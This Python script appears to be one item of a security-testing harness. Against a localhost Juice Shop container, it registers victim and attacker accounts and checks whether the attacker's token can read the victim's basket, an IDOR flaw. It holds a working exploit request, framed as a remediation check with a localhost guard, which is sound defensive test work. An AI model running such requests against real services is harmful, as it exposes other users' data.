#!/usr/bin/env python3
"""pt01: Broken Access Control / IDOR on Juice Shop's basket endpoint.

Registers two fresh throwaway accounts against a running Juice Shop
container, then checks whether one account's bearer token can read the
other account's basket contents (GET /rest/basket/{id}).

Standard library only (urllib). Refuses to run against anything but a
localhost target -- see ledger.guard_target_host.

Usage:
    python items/pt01-idor-juice-shop/scenario.py --target http://localhost:3001
    python items/pt01-idor-juice-shop/scenario.py --target http://localhost:3002  # through the proxy
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt01-001.json"


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, json.loads(resp.read().decode())
    except urllib.error.HTTPError as exc:
        try:
            parsed = json.loads(exc.read().decode())
        except Exception:
            parsed = {}
        return exc.code, parsed


def _register_and_login(host: str, email: str, password: str) -> tuple[str, int]:
    status, _ = _request("POST", f"{host}/api/Users", body={
        "email": email, "password": password, "passwordRepeat": password,
    })
    if status != 201:
        raise RuntimeError(f"registration of {email} failed: HTTP {status}")
    status, body = _request("POST", f"{host}/rest/user/login", body={
        "email": email, "password": password,
    })
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    auth = body["authentication"]
    return auth["token"], auth["bid"]


def run(target: str, vuln_id: str, mitre_technique: str) -> dict:
    ledger.guard_target_host(target)

    stamp = str(time.time()).replace(".", "")
    victim_email = f"pt01-victim-{stamp}@flatline.test"
    attacker_email = f"pt01-attacker-{stamp}@flatline.test"

    victim_token, victim_basket = _register_and_login(target, victim_email, "VictimPass123!")
    attacker_token, attacker_basket = _register_and_login(target, attacker_email, "AttackerPass123!")

    # Legitimate check: each user reading their OWN basket must keep working
    # in every condition. This is the "cost" half of the paired score.
    v_status, v_body = _request("GET", f"{target}/rest/basket/{victim_basket}", token=victim_token)
    legitimate_victim_ok = v_status == 200 and v_body.get("data", {}).get("id") == victim_basket

    a_status, a_body = _request("GET", f"{target}/rest/basket/{attacker_basket}", token=attacker_token)
    legitimate_attacker_ok = a_status == 200 and a_body.get("data", {}).get("id") == attacker_basket

    # The attack: attacker's token requests the VICTIM's basket id.
    exploit_status, exploit_body = _request(
        "GET", f"{target}/rest/basket/{victim_basket}", token=attacker_token
    )

    if exploit_status in (401, 403):
        status = "REMEDIATED"
        summary = f"Blocked with HTTP {exploit_status}."
    elif exploit_status == 200 and exploit_body.get("data", {}).get("id") == victim_basket:
        status = "VULNERABLE"
        summary = (
            f"Attacker token read victim's basket (id={victim_basket}, "
            f"UserId={exploit_body['data'].get('UserId')}) with no ownership check."
        )
    else:
        status = "ERROR"
        summary = f"Inconclusive: HTTP {exploit_status}, body={exploit_body}"

    result = {
        "vulnerability_id": vuln_id,
        "mitre_technique": mitre_technique,
        "target": target,
        "status": status,
        "exploit_http_status": exploit_status,
        "summary": summary,
        "legitimate_victim_basket_ok": legitimate_victim_ok,
        "legitimate_attacker_basket_ok": legitimate_attacker_ok,
    }
    return result


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]
    vuln_id = blueprint["vulnerability_id"]
    mitre_technique = blueprint["mitre_technique"]

    result = run(target, vuln_id, mitre_technique)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{vuln_id}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt01-idor-juice-shop", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
